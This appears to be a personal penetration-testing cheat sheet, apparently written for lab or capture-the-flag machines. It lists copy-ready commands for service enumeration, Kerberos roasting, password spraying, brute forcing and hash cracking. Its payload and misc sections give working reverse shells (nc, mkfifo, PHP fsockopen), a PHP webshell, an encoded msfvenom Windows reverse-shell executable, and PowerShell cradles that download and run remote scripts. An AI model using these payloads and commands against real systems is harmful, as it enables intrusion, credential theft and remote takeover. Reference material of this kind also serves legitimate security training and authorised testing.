## Index

- [Enumeration](#enumeration)
- [Vulnerabilities](#vulnerabilities)
- [Bruteforce](#bruteforce)
- [Payloads](#payloads)
- [Privesc](#privesc)
- [Misc](#misc)

## Enumeration

### Ports & services

I always run the following 2 scans to begin with. Heard about UDP scans but I haven't needed it yet.  

- Basic scan  

```
nmap -sT -sV -sC $HOST -oN nmapinit
```
-sT : TCP connect scan (as opposed to -sS which is SYN scan)  
-sV : Version detection  
-sC : Run default scripts (equivalent to --script=default)  
-oN : Normal output  

- All ports (fast)  

```
nmap -p- --max-retries 0 --min-rate 5000 $HOST -oN nmapfull
```
-p- : All ports  
--max-retries : Cap number of retransmission (default is 10)  
--min-rate : Packets per second to send  

When fast scan detects more ports, I run the first scan again on the newly found ports (for example `-p 45678,45679`)  

### 53 - DNS

- Zone transfer  

```
dig axfr @$HOST $DOMAIN
```
or  
```
host -l $DOMAIN $HOST
```

### 80 & 443 - Web (HTTP/HTTPS)

- Gobuster  

I always use gobuster for web enumeration, with at least 2 wordlists :  
```
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirb/common.txt
```
and  
```
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
Depending on the situation, add `-x` option with file extensions.  
For example if server is Windows IIS you'll probably want to add `-x asp,aspx` or if server is Linux running Apache `-x html,php`.  
You may also want to find forgotten files with `-x txt,bak,old,xml`.  

More useful options :  
`--insecuressl` to ignore ssl check  
`-t 20` number of threads  
`-s 200` to restrict by HTTP status (default is 200,204,301,302,307,401,403)  

- SSLyze  

Check if target is vulnerable to heartbleed :  
```
sslyze --heartbleed $HOST
```

- Nikto  

Check for common vulnerabilities or misconfigurations :  
```
nikto -host http://$HOST
```

### 88 & 464 - Kerberos

- AS-REP roasting with Impacket - GetNPUsers.py  

Get TGTs of users who have "do not require Kerberos preauthentication" set :  
```
python GetNPUsers.py $DOMAIN/ -dc-ip $HOST -request
```

For a specific user :  
```
# no creds
python GetNPUsers.py $DOMAIN/$USER -dc-ip $HOST -no-pass

# with creds
python GetNPUsers.py $DOMAIN/$USER:$PWD -dc-ip $HOST
```

- Kerbrute  

**User enumeration :**  
```
kerbrute userenum --dc $HOST -d $DOMAIN $WORDLIST
```
Example :  
`kerbrute userenum --dc 10.10.10.10 -d domain.local /opt/SecLists/Usernames/xato-net-10-million-usernames-dup.txt`  

**Bruteforce user :**  
```
kerbrute bruteuser --dc $HOST -d $DOMAIN $WORDLIST $USER
```
Example :  
`kerbrute bruteuser --dc 10.10.10.10 -d domain.local /usr/share/wordlists/rockyou.txt alice`  

**Password spray :**  
```
kerbrute passwordspray --dc $HOST -d $DOMAIN $FILE_USERS $PASSWORD
```
Example :  
`kerbrute passwordspray --dc 10.10.10.10 -d domain.local domain_users.txt Password123!`  

### 111 & 135 - RPC

- rpcclient  

Connect with null session :  
```
rpcclient -U "" $HOST
```

Enum users and give RIDs :  
```
rpcclient> enumdomusers
```

Enum privileges :  
```
rpcclient> enumprivs
```

Query user with RID :  
```
rpcclient> queryuser $RID
```

Query user's groups with RID :  
```
rpcclient> queryusergroups $RID
```

Query group with RID :  
```
rpcclient> querygroup $RID
```

- RPCScan  

List RPC services :  
```
python3 rpc-scan.py $HOST --rpc
```

List mountpoints :  
```
python3 rpc-scan.py $HOST --mounts
```

List NFS shares :  
```
python3 rpc-scan.py $HOST --nfs --recurse 3
```

List on NFS share :
```
python3 nfs-ls.py nfs://$HOST/$PATH
```
Example :  
`python3 nfs-ls.py nfs://10.10.10.10/example_dir`  

Get file on NFS share :
```
python3 nfs-get.py nfs://$HOST/$PATH -d $OUT
```
Example :  
`python3 nfs-get.py nfs://10.10.10.10/example_dir/example_file.txt -d example_file.txt`  

### 139 & 445 - SMB

- smbclient  

List shares :  
```
smbclient -L //$HOST -U $USER
```

Connect :  
```
smbclient //$HOST -U $USER
```

Download dir recursively :
```
smb: \> prompt
smb: \> recurse
smb: \> mget directory
```

- smbmap  

Enum smb share :  
```
# no creds
smbmap -H $HOST

# with creds
smbmap -H $HOST -d $DOMAIN -u $USER -p $PWD
```
Example :  
`smbmap -H 10.10.10.10 -d domain.local -u bob -p 'Password123!'`

- crackmapexec  

Null session :  
```
crackmapexec smb $HOST -u '' -p ''
```

Enum :  
```
# shares :
crackmapexec smb $HOST -u $USER -p $PWD --shares

# sessions :
crackmapexec smb $HOST -u $USER -p $PWD --sessions

# disks :
crackmapexec smb $HOST -u $USER -p $PWD --disks

# logged-on users :
crackmapexec smb $HOST -u $USER -p $PWD --loggedon-users

# domain users :
crackmapexec smb $HOST -u $USER -p $PWD --users

# domain groups :
crackmapexec smb $HOST -u $USER -p $PWD --groups

password policy :
crackmapexec smb $HOST -u $USER -p $PWD --pass-pol
```

Pass-The-Hash :  
```
crackmapexec smb $HOST -u $USER -H $HASH
```

- enum4linux

Not actively maintained but still useful :
```
enum4linux $HOST
```

### 389(636) & 3268(3269) - LDAP

- ldapsearch  

Basic enum :  
```
ldapsearch -h $HOST -x -s base namingcontexts
```
-h : host  
-x : simple authentication  
-s : scope  

Can be followed by :  
```
ldapsearch -h $HOST -x -b "DC=$DOMAIN" > ldap.out
```
-b : branch  
Example :  
`ldapsearch -h 10.10.10.10 -x -b "DC=domain,DC=local" > ldap.out`  

You may also want to apply filters, for example by requesting only users :  
```
ldapsearch -h $HOST -x -b "DC=$DOMAIN" '(objectClass=user)'
```

And for each user, its sAMAccountName :  
```
ldapsearch -h $HOST -x -b "DC=$DOMAIN" '(objectClass=user)' sAMAccountName
```

- ldapdomaindump  

Tool for dumping all LDAP info with valid creds :
```
ldapdomaindump -u $HOST\\$USER -p $PWD $DOMAIN
```
Example :  
`ldapdomaindump -u 10.10.10.10\\alice -p 'Password123!' domain.local`  

## Vulnerabilities

- Searchsploit  

Off-line tool for searching exploit-db.  

Basic search :  
```
searchsploit $KEYWORDS
```
Examples :  
`searchsploit ms17-010`  
`searchsploit apache 2.4`  

Get details about exploit :  
```
searchsploit -x $EXPLOIT
```

Copy exploit in current directory :  
```
searchsploit -m $EXPLOIT
```

Update database :  
```
searchsploit -u
```

## Bruteforce

- Hydra  

**Web basic authentication :**
```
hydra -l $USER -P $WORDLIST $HOST -s $PORT http-get /$DIRECTORY/$PATH
```
Example :  
`hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.10.10 -s 8080 /example/directory`  

**Web FORM Post :**
```
hydra -l $USER -P $WORDLIST $HOST http-post-form "/:username=^USER^&password=^PASS^&Login=Login:invalid"
```
Example :  
`hydra -l bob -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/:username=^USER^&password=^PASS^&Login=Login:invalid"`  
**Replace values accordingly (username, password, etc.)**  

**SSH :**  
```
hydra -l $USER -P $WORDLIST ssh://$HOST:$PORT
```
Example :  
`hydra -l alice -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.10:2222`  

-f : quits after first login/password found  

- Hashcat  

I tend to prefer John over hashcat since it's (imho) easier to use but I should definitely look more into it.
```
hashcat -m $HASH-TYPE -a $MODE $HASH $WORDLIST
```
Example (Kerberoast) :  
`hashcat -m 13100 -a 0 spn.hash /usr/share/wordlists/rockyou.txt`  

- John  

```
john $HASH $WORDLIST
```
It's often as easy as "give him the password and the wordlist and let him do its thing", it automatically finds the correct hash format and attempt to crack it.  

## Payloads

Some reverse shell payloads I've found successful :  

- shell  

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f
```

- PHP  

```
<?php passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"); ?>
```
or
```
$sock=fsockopen("$IP",$PORT);exec("/bin/sh -i <&3 >&3 2>&3");
```

- Webshells  

Minimal webshell :
```
<?php echo system(($_REQUEST['cmd'])); ?>
```
Execute with :  
`http://host/page?cmd=whoami`  

- msfvenom  

List payloads :  
```
msfvenom -l payloads
```

General syntax :  
```
msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f $FILE_FORMAT > $OUTPUT_FILE
```

Reverse shell Windows :  
```
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -b "\x00" -e x86/shikata_ga_nai -f exe -o $OUTPUT_FILE
```
Example :  
`msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=10.10.10.10 LPORT=1337 -b "\x00" -e x86/shikata_ga_nai -f exe -o rev.exe`  

-a : architecture  
-b : bad characters  
-e : encoding  


## Privesc

Tools can help to find the way to privesc, but they shouldn't substitute manual enumeration. Make sure to always verify their result manually.  

### Tools

- Linux  

[pspy](https://github.com/DominicBreuker/pspy)  
[LinEnum](https://github.com/rebootuser/LinEnum)  
[LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)  

- Windows  

[winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)  
[BloodHound](https://github.com/BloodHoundAD/BloodHound)  
with [SharpHound](https://github.com/BloodHoundAD/SharpHound3)  
[PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/dev)  
with [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)  
and [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)  
[SessionGopher](https://github.com/Arvanaghi/SessionGopher)  
[Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)  

### Manual enum

- Linux  

```
sudo -l 

ls -al /

uname -a

cat /etc/passwd

ls -alhR /home

ls -al /var/www

ps -ef

find /usr/bin/ -perm -4000
```

- Windows  

```
systeminfo

hostname

# privileges and groups of current user
whoami /all

# list users
net users

# details about user
net user alice

# rights of file or directory
icacls file.txt

# hidden dir / files
dir /A:H

# recursive dir
dir /S

# search for password in files
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt

# search for password in registry
REG QUERY HKLM /F "password" /t REG_SZ /S /K

# process list
tasklist /v

# scheduled tasks
schtasks /query /fo LIST /v
```

### Common exploits

- [Juicy Potato](http://ohpe.it/juicy-potato/)  

Look for `SeImpersonatePrivilege` to `Enabled` with `whoami /priv`  

## Misc

Didn't know how to name and sort this category.  
When I started I was struggling with downloading / uploading or executing files and scripts between my machine (kali) and the box I was attacking, now that I'm more comfortable let me share this.

### Hosting files on Kali

- HTTP  

```
python -m SimpleHTTPServer 80
```
Files in current directory available at `http://$HOST/$FILE`  

- SMB  

This one is life-saviour, I use it on almost every Windows box
```
impacket-smbserver share .
```
Files in current directory available at `\\$HOST\share\$FILE`  

For example if you have basic command execution on server but no reverse shell yet, you can start smbserver with nc.exe in current directory, and execute the following command to get a reverse shell :  
`\\10.10.10.10\share\nc.exe 10.10.10.10 1337 -e cmd.exe`  
(Of course you need to setup a listener beforehand with `nc -nvlp 1337`)  
Also check [here](#reverse-shells-from-code-execution-on-windows)  

### Downloading & Uploading files on Linux

- wget  

```
# download
wget http://$HOST/$FILE

# upload
wget --post-file=$FILE $HOST
```

- nc  

```
# download
nc -nvlp 1337 > $FILE

# upload
nc $HOST 1337 < $FILE
```

### Downloading & Uploading files on Windows

- cmd (certutil)  

```
# download
certutil.exe -urlcache -split -f http://$HOST/$FILE $OUTPUT_FILE
```

- Powershell  

```
# download
(new-object net.webclient).downloadstring('http://$HOST/$FILE')
# or 
(new-object net.webclient).downloadfile('http://$HOST/$FILE', 'C:\$PATH\$FILE.exe')

# remote exec
echo IEX(New-Object Net.WebClient).DownloadString('http://$HOST/$FILE') | powershell -noprofile -
```

- smbserver  

See [Hosting files on Kali](#hosting-files-on-kali)  

```
# download (kind of)
copy \\$IP\share\$FILE .

# exec
\\$IP\share\$FILE.exe
```

### Reverse shells from code execution on Windows

- Basic shell

```
\\10.10.10.10\share\nc.exe 10.10.10.10 1337 -e cmd.exe
```

- Powershell with [Nishang](https://github.com/samratashok/nishang)

```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 1337
```

### Reverse shells from code execution on Linux

```
nc 10.10.10.10 1337 -e /bin/bash
```
